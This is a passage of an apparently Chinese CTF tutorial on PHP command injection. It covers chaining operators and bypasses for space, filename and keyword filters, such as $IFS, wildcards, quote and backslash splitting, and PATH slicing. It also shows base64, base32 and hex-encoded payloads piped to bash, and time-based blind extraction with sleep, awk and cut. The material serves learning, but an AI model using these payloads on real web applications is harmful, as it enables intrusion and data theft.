shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">id</span>;<span class="hljs-built_in">ls</span>;<span class="hljs-built_in">pwd</span></span><br></code></pre></td></tr></table></figure><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-18.png"></p><p>实例：</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-19.png"></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">payload：?<span class="hljs-keyword">cmd</span><span class="language-bash">=;<span class="hljs-built_in">cat</span> flag.php</span><br></code></pre></td></tr></table></figure><p>连接之后代码变为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span>;<span class="hljs-built_in">cat</span> flag.php<br></code></pre></td></tr></table></figure><p>然后右键查看源码即可查看flag，或者使用tac直接回显</p><h3 id="-1"><a href="#-1" class="headerlink" title="&amp;"></a>&amp;</h3><p>使命令在后台运行</p><p>这样就可以同时执行多条命令</p><p>如果前面的命令出错不影响后面的命令执行</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-20.png"></p><p>注意：这里&amp;要使用url编码</p><h3 id="-2"><a href="#-2" class="headerlink" title="&amp;&amp;"></a>&amp;&amp;</h3><p>如果前面的命令执行成功</p><p>则执行后面的命令</p><p>前面的命令执行成功才会进行后面的命令</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-21.png"></p><h3 id="-3"><a href="#-3" class="headerlink" title="|"></a>|</h3><p>将前面的命令的输出作为后面命令的输入，把前面命令的结果当成后面命令的参数；</p><p>前面的命令和后面的命令都会执行，但只显示后面的命令执行结果</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-22.png"></p><h3 id="-4"><a href="#-4" class="headerlink" title="||"></a>||</h3><p>类似于程序中的if-else语句。</p><p>若前面的命令执行成功，则后面的命令就不会执行</p><p>若前面的命令执行失败，则执行后面的命令</p><p>实例：</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-23.png"></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">payload：?<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">ls</span>||</span><br></code></pre></td></tr></table></figure><h2 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h2><p>例题：</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-24.png"></p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-25.png"></p><h3 id="绕过方法："><a href="#绕过方法：" class="headerlink" title="绕过方法："></a><strong>绕过方法：</strong></h3><h4 id="1-大括号-cat-flag-txt"><a href="#1-大括号-cat-flag-txt" class="headerlink" title="1.大括号{cat,flag.txt};"></a>1.大括号{cat,flag.txt};</h4><h4 id="2-IFS代替空格-IFS、-IFS-、-IFS-9"><a href="#2-IFS代替空格-IFS、-IFS-、-IFS-9" class="headerlink" title="2.$IFS代替空格;$IFS、${IFS}、$IFS$9"></a>2.$IFS代替空格;$IFS、${IFS}、$IFS$9</h4><p>Linux下有一个特殊的环境变量叫做IFS，叫做内部字段分隔符（internal field separator）。</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">ls</span><span class="hljs-variable">$IFS</span>-l</span><br></code></pre></td></tr></table></figure><p>单纯$IFS2，IFS2被bash解释器当做变量名，输不出来结果，加一个{}就固定了变量名。</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">ls</span><span class="hljs-variable">$&#123;IFS&#125;</span>-l</span><br></code></pre></td></tr></table></figure><p>$IFS$9-后面加个$与{}类似，起截断作用，$9是当前系统shell进程第九个参数持有者，始终为空字符串</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">ls</span>$IFS<span class="hljs-variable">$9</span>-l</span><br></code></pre></td></tr></table></figure><h4 id="3-重定向字符"><a href="#3-重定向字符" class="headerlink" title="3.重定向字符&lt;，&lt;&gt;;"></a>3.重定向字符&lt;，&lt;&gt;;</h4><p>“&lt;”表示的是输入重定向的意思，就是把&lt;后面跟的文件取代键盘作为新的输入设备。</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">cat</span>&lt;flag.php</span><br></code></pre></td></tr></table></figure><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">cat</span>&lt;&gt;flag.php</span><br></code></pre></td></tr></table></figure><p>4.url编码：%09（Tab），%20（space）;</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">cat</span>%09flag.php</span><br></code></pre></td></tr></table></figure><p>一般使用%09，因为%20就是空格，空格被过滤了。</p><h2 id="文件名过滤绕过"><a href="#文件名过滤绕过" class="headerlink" title="文件名过滤绕过"></a>文件名过滤绕过</h2><p>例题：</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-26.png"></p><h3 id="绕过方法：-1"><a href="#绕过方法：-1" class="headerlink" title="绕过方法："></a>绕过方法：</h3><h4 id="1-通配符-绕过"><a href="#1-通配符-绕过" class="headerlink" title="1.通配符 ? * 绕过"></a>1.通配符 ? * 绕过</h4><p>通配符是一种特殊语句，主要有问号（?）和星号（*），用来模糊搜索文件。</p><p>?在linux里面可以进行代替字符。?仅代表单个字符串，但次单字必须存在。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">cat</span> fl?g.tx?</span><br><br>这样都行<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">cat</span> ????.???</span><br></code></pre></td></tr></table></figure><p>*在linux里面可以进行模糊匹配。*可以代表任何字符串</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">cat</span> f*</span><br>多个匹配结果同时显示<br></code></pre></td></tr></table></figure><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=passthru(<span class="hljs-string">&#x27;cat fl?g.p?p&#x27;</span>);查看源代码</span><br></code></pre></td></tr></table></figure><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=passthru(<span class="hljs-string">&#x27;cat fl*&#x27;</span>);</span><br><br>这样都行<br>?<span class="hljs-keyword">cmd</span><span class="language-bash">=passthru(<span class="hljs-string">&#x27;cat *&#x27;</span>);</span><br></code></pre></td></tr></table></figure><h4 id="2-单引号、双引号绕过"><a href="#2-单引号、双引号绕过" class="headerlink" title="2.单引号、双引号绕过"></a>2.单引号、双引号绕过</h4><p>‘’,””空字符，在linux中等于插了个寂寞（空字符），但是能绕过正则匹配</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">cmd</span>=passthru(&#x27;cat fl<span class="hljs-string">&quot;&quot;</span>ag.ph<span class="hljs-string">&quot;&quot;</span>p<span class="hljs-string">&#x27;);</span><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">echo</span> fl<span class="hljs-string">&quot;ag.ph&quot;</span><span class="hljs-string">&quot;p</span></span><br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">flag.php<br></code></pre></td></tr></table></figure><h4 id="3-反斜杠-绕过"><a href="#3-反斜杠-绕过" class="headerlink" title="3.反斜杠 \ 绕过"></a>3.反斜杠 \ 绕过</h4><p>把特殊字符去掉功能性，单纯表示为字符串。</p><p>绕过原理：（转义），对于php来说是添加了\但是对于linux来说只是转义符号，会自动去掉</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta">#ehco benben &gt; -dazhuang这里的&gt;会将benben写入到-dazhuang文件里</span><br></code></pre></td></tr></table></figure><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">#cat fl\ag.t\xt<br></code></pre></td></tr></table></figure><p>在linux中还可当做命令连接符使用</p><h4 id="4-特殊变量：-1到-9、-和-等"><a href="#4-特殊变量：-1到-9、-和-等" class="headerlink" title="4.特殊变量：$1到$9、$@和$*等"></a>4.特殊变量：$1到$9、$@和$*等</h4><p>绕过原理：这些变量在linux中输出为空</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">cat</span> fl<span class="hljs-variable">$1ag</span>.t<span class="hljs-variable">$9xt</span></span><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">cat</span> fl$*\ag.txt</span><br></code></pre></td></tr></table></figure><h4 id="5-内联执行"><a href="#5-内联执行" class="headerlink" title="5.内联执行"></a>5.内联执行</h4><p>自定义字符串，再拼接起来</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso">#a=f;d=ag;c=l;cat $a$c$d.txt表示cat flag.txt<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">cmd</span>=passthru(&#x27;a=fl;d=ag;c=p;h=h;cat <span class="hljs-variable">$a</span><span class="hljs-variable">$d</span>.<span class="hljs-variable">$c</span><span class="hljs-variable">$h</span><span class="hljs-variable">$c</span><span class="hljs-string">&#x27;);</span><br></code></pre></td></tr></table></figure><h4 id="6-利用linux中的环境变量"><a href="#6-利用linux中的环境变量" class="headerlink" title="6.利用linux中的环境变量"></a>6.利用linux中的环境变量</h4><p>使用环境变量里的字符执行变量</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-27.png"></p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-28.png"></p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart">?cmd=passthru(<span class="hljs-string">&#x27;f<span class="hljs-subst">$&#123;PATH:<span class="hljs-number">5</span>:<span class="hljs-number">1</span>&#125;</span><span class="hljs-subst">$&#123;PATH:<span class="hljs-number">8</span>:<span class="hljs-number">1</span>&#125;</span><span class="hljs-subst">$&#123;PATH:<span class="hljs-number">66</span>:<span class="hljs-number">1</span>&#125;</span>.<span class="hljs-subst">$&#123;PATH:<span class="hljs-number">93</span>:<span class="hljs-number">1</span>&#125;</span>h<span class="hljs-subst">$&#123;PATH:<span class="hljs-number">93</span>:<span class="hljs-number">1</span>&#125;</span>&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="常见文件读取命令绕过"><a href="#常见文件读取命令绕过" class="headerlink" title="常见文件读取命令绕过"></a>常见文件读取命令绕过</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">more:一页一页的显示档案内容<br>less:与 more 类似 <span class="hljs-built_in">head</span>:查看头几行<br><span class="hljs-built_in">tac</span>:从最后一行开始显示，可以看出 <span class="hljs-built_in">tac</span> 是<span class="hljs-built_in">cat</span> 的反向显示<br><span class="hljs-built_in">tail</span>:查看尾几行<br><span class="hljs-built_in">nl</span>：显示的时候，顺便输出行号,跟<span class="hljs-built_in">cat</span>功能类似<br><span class="hljs-built_in">od</span>:以二进制的方式读取档案内容<br>vi:一种编辑器，这个也可以查看<br>vim:一种编辑器，这个也可以查看<br><span class="hljs-built_in">sort</span>:可以查看，用于排序文件<br>passthru(<span class="hljs-string">&quot;/usr/bin/s?rt&quot;</span> fl\ag.p\hp)<br><span class="hljs-built_in">uniq</span>:可以查看报告或删除文件中重复的文件<br>file -f:报错出具体内容 <br>grep 在文件中查找某些字符串<br>1、在当前目录中，查找后缀有 file 字样的文件中包含 <span class="hljs-built_in">test</span> 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep <span class="hljs-built_in">test</span> *file strings<br>2.查找flag：?cmd=passthru(<span class="hljs-string">&quot;grep fla fla*&quot;</span>) 从fla*文件中查找包含fla的字符串<br></code></pre></td></tr></table></figure><p>例题：</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-29.png"></p><h3 id="绕过方法：-2"><a href="#绕过方法：-2" class="headerlink" title="绕过方法："></a>绕过方法：</h3><h4 id="1-tac：反向显示"><a href="#1-tac：反向显示" class="headerlink" title="1.tac：反向显示"></a>1.tac：反向显示</h4><p>与cat功能类似，但是反向显示，从最后一行往前开始显示。</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-comment">#cat flag.txt</span><br><span class="hljs-comment">#tac flag.txt当前页面可直接显示</span><br>?<span class="hljs-keyword">cmd</span><span class="language-bash">=passthru(<span class="hljs-string">&quot;ls&quot;</span>);</span><br>?<span class="hljs-keyword">cmd</span><span class="language-bash">=passthru(<span class="hljs-string">&quot;tac fl\ag.ph\p&quot;</span>);</span><br></code></pre></td></tr></table></figure><h4 id="2-more：一页一页的显示档案内容"><a href="#2-more：一页一页的显示档案内容" class="headerlink" title="2.more：一页一页的显示档案内容"></a>2.more：一页一页的显示档案内容</h4><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=passthru(<span class="hljs-string">&quot;more fl\ag.ph\p&quot;</span>);</span><br></code></pre></td></tr></table></figure><h4 id="3-less：与more类似"><a href="#3-less：与more类似" class="headerlink" title="3.less：与more类似"></a>3.less：与more类似</h4><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=passthru(<span class="hljs-string">&quot;less fl\ag.ph\p&quot;</span>);</span><br></code></pre></td></tr></table></figure><h4 id="4-tail：查看末尾几行"><a href="#4-tail：查看末尾几行" class="headerlink" title="4.tail：查看末尾几行"></a>4.tail：查看末尾几行</h4><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=passthru(<span class="hljs-string">&quot;tail fl\ag.ph\p&quot;</span>);默认显示最后10行</span><br></code></pre></td></tr></table></figure><h4 id="5-nl：显示的时候，顺便输出行号"><a href="#5-nl：显示的时候，顺便输出行号" class="headerlink" title="5.nl：显示的时候，顺便输出行号"></a>5.nl：显示的时候，顺便输出行号</h4><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=passthru(<span class="hljs-string">&quot;nl fl\ag.ph\p&quot;</span>);效果和<span class="hljs-built_in">cat</span>相同只是多了个输出行号</span><br></code></pre></td></tr></table></figure><h4 id="6-od：以二进制的方式读取档案内容"><a href="#6-od：以二进制的方式读取档案内容" class="headerlink" title="6.od：以二进制的方式读取档案内容"></a>6.od：以二进制的方式读取档案内容</h4><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=passthru(<span class="hljs-string">&quot;od -A d -c fla\g.ph\p&quot;</span>);</span><br></code></pre></td></tr></table></figure><h4 id="7：xxd：读取二进制文件"><a href="#7：xxd：读取二进制文件" class="headerlink" title="7：xxd：读取二进制文件"></a>7：xxd：读取二进制文件</h4><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=passthru(<span class="hljs-string">&quot;xxd fla\g.ph\p&quot;</span>);</span><br></code></pre></td></tr></table></figure><h4 id="8-sort：主要用于排序文件"><a href="#8-sort：主要用于排序文件" class="headerlink" title="8.sort：主要用于排序文件"></a>8.sort：主要用于排序文件</h4><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-comment">#sort flag.txt</span><br>?<span class="hljs-keyword">cmd</span><span class="language-bash">=passthru(<span class="hljs-string">&quot;/usr/bin/s?rt fla\g.ph\p&quot;</span>);</span><br></code></pre></td></tr></table></figure><h4 id="9-uniq：报告或删除文件中重复的行"><a href="#9-uniq：报告或删除文件中重复的行" class="headerlink" title="9.uniq：报告或删除文件中重复的行"></a>9.uniq：报告或删除文件中重复的行</h4><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=passthru(<span class="hljs-string">&quot;uniq fla\g.ph\p&quot;</span>);直接当<span class="hljs-built_in">cat</span>用</span><br></code></pre></td></tr></table></figure><h4 id="10-file-f：报错出具体内容"><a href="#10-file-f：报错出具体内容" class="headerlink" title="10.file -f：报错出具体内容"></a>10.file -f：报错出具体内容</h4><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=passthru(<span class="hljs-string">&quot;file -f fla\g.ph\p&quot;</span>);</span><br>以每行的内容作为文件去读取<br></code></pre></td></tr></table></figure><h4 id="11-grep：在文本中查找指定的字符串"><a href="#11-grep：在文本中查找指定的字符串" class="headerlink" title="11.grep：在文本中查找指定的字符串"></a>11.grep：在文本中查找指定的字符串</h4><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=passthru(<span class="hljs-string">&quot;grep fla fla*&quot;</span>);</span><br>从fla*文本文件中搜索包含<span class="hljs-string">&quot;fla&quot;</span>字符串的行<br></code></pre></td></tr></table></figure><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><h3 id="绕过原理："><a href="#绕过原理：" class="headerlink" title="绕过原理："></a>绕过原理：</h3><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-30.png"></p><h3 id="绕过方法：-3"><a href="#绕过方法：-3" class="headerlink" title="绕过方法："></a>绕过方法：</h3><h4 id="1-base64编码"><a href="#1-base64编码" class="headerlink" title="1.base64编码"></a><strong>1.base64编码</strong></h4><p>python</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs coq">import base64<br>S = b&#x27;cat flag.php&#x27;<br>e64 = base64.b64encode(S)参数s的类型必须是字节包（bytes）<br>print(e64)<br><br>cat flag.php -&gt; Y2FOIGZsYWcucGhw<br>tac flag.php -&gt; dGFjIGZsYWcucGhw<br><br>执行命令<br>#echo Y2FOIGZsYWcucGhw | <span class="hljs-type">base64</span> -d | <span class="hljs-type">bash</span><br>|<span class="hljs-type">把cat</span> flag.php 放在bash里执行| <span class="hljs-type">base64</span> -d<br>|<span class="hljs-type">把前面指令执行的结果，变成后面指令的参数</span><br><span class="hljs-type">cat</span> flag.php解码读取命令<br><br><br>|<span class="hljs-type">把cat</span> flag.php 放在bash里执行<br>#echo Y2FOIGZsYWcucGhw | <span class="hljs-type">base64</span> -d | <span class="hljs-type">bash</span>执行命令<br>#`echo Y2FOIGZsYWcucGhw | <span class="hljs-type">base64</span> -d`<br>#$(echo Y2FOIGZsYWcucGhw | <span class="hljs-type">base64</span> -d)<br><br>payload:<br>?cmd=passthru(&#x27;`echo <span class="hljs-string">&quot;Y2FOIGZsYWcucGhw&quot;</span>|<span class="hljs-type">base64</span> -d`&#x27;);<br>?cmd=passthru(&#x27;`echo <span class="hljs-string">&quot;dGFjIGZsYWcucGhw&quot;</span>|<span class="hljs-type">base64</span> -d`&#x27;);<br></code></pre></td></tr></table></figure><h4 id="2-bas32编码"><a href="#2-bas32编码" class="headerlink" title="2.bas32编码"></a><strong>2.bas32编码</strong></h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import base64<br>S = b<span class="hljs-string">&#x27;cat flag.php&#x27;</span><br>e64 = base64.b32encode(S)<br><span class="hljs-built_in">print</span>(e64)<br><br>payload:<br>cat flag.php -&gt; <span class="hljs-attribute">MNQXIIDGNRQWOLTQNBYA</span>====<br>?<span class="hljs-attribute">cmd</span>=system(&#x27;echo <span class="hljs-string">&quot;MNQXIIDGNRQWOLTQNBYA====&quot;</span>|base32 -d|/bin/bash<span class="hljs-string">&#x27;);</span><br></code></pre></td></tr></table></figure><p>base32和Base64的区分方法<br>        看到编码内容，只有大写和数字<br>        根据Base64和Base32 区别：<br>        base64中包含大写字母（A-Z），小写字母（a-z），数字0—9以及+&#x2F;；<br>        base32中只包含大写字母（A-Z）和数字234567</p><h4 id="3-HEX编码"><a href="#3-HEX编码" class="headerlink" title="3.HEX编码"></a><strong>3.HEX编码</strong></h4><p>ASCII码</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs coq">import binascii<br>s = b<span class="hljs-string">&quot;tac flag&quot;</span><br>h = binascii.b2a_hex(s)<br>print(h)<br><br>tac flag.php -&gt; <span class="hljs-number">74616320666</span>c61672e706870<br><br>执行命令<br>#echo <span class="hljs-string">&quot;74616320666c61672e706870&quot;</span>|<span class="hljs-type">xxd</span> -r -p|<span class="hljs-type">bash</span><br>xxd：二进制显示和处理文件工具<br>-r -p：将纯十六进制转储的反向输出打印为了ascll格式<br>bash也可换成sh、/bin/bash、反引号<br><br>payload:<br>?cmd=passthru(&#x27;echo <span class="hljs-string">&quot;74616320666c61672e706870&quot;</span>|<span class="hljs-type">xxd</span> -r -p|<span class="hljs-type">bash</span>&#x27;);<br></code></pre></td></tr></table></figure><h4 id="4-shellcode编码"><a href="#4-shellcode编码" class="headerlink" title="4.shellcode编码"></a>4.shellcode编码</h4><p>16进制的机器码</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cos">将<span class="hljs-keyword">ascii</span>码前加\<span class="hljs-keyword">x</span><br>用<span class="hljs-keyword">print</span>打印 <span class="hljs-comment">//echo 无法执行</span><br>?cmd=passthru(<span class="hljs-string">&quot;print&#x27;shellcode编码&#x27;|bash&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-31.png"></p><p>反引号、$()都可</p><h2 id="无回显时间盲注"><a href="#无回显时间盲注" class="headerlink" title="无回显时间盲注"></a>无回显时间盲注</h2><h3 id="命令盲注"><a href="#命令盲注" class="headerlink" title="命令盲注"></a>命令盲注</h3><p>页面无法shell反弹或者无法回显，或者没有写入权限，可尝试命令盲注。</p><p>根据返回的时间来进行判断;</p><p>读取文件指定行的指定位置的字符;</p><p>if判断语句</p><h3 id="相关命令"><a href="#相关命令" class="headerlink" title="相关命令"></a><strong>相关命令</strong></h3><p><strong>1.sleep</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">sleep</span> 5</span><br>5秒之后返回结果<br></code></pre></td></tr></table></figure><p><strong>2.awk NR</strong></p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">#cat flag<br>hello<br>Flag&#123;succss!!&#125;<br></code></pre></td></tr></table></figure><p><strong>cat+awk NR逐行获取数据</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">cat</span> flag | awk NR==1</span><br>hello<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">cat</span> flag | awk NR==2</span><br>Flag&#123;succss!!&#125;<br></code></pre></td></tr></table></figure><p><strong>3.cut -c</strong></p><p><strong>cut命令逐列获取单个字符</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">cat</span> flag | awk NR==2 | <span class="hljs-built_in">cut</span> -c 1</span><br>F<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">cat</span> flag | awk NR==2 | <span class="hljs-built_in">cut</span> -c 2</span><br>l<br></code></pre></td></tr></table></figure><p><strong>4.if语句判断命令是否执行</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-keyword">if</span> [$(<span class="hljs-built_in">cat</span> flag | awk NR==2 | <span class="hljs-built_in">cut</span> -c 1) == F];<span class="hljs-keyword">then</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;right&quot;</span>;<span class="hljs-keyword">fi</span></span><br>right<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-keyword">if</span> [$(<span class="hljs-built_in">cat</span> flag | awk NR==2 | <span class="hljs-built_in">cut</span> -c 1) == a];<span class="hljs-keyword">then</span> <span class="hljs-built_in">echo</span> <span 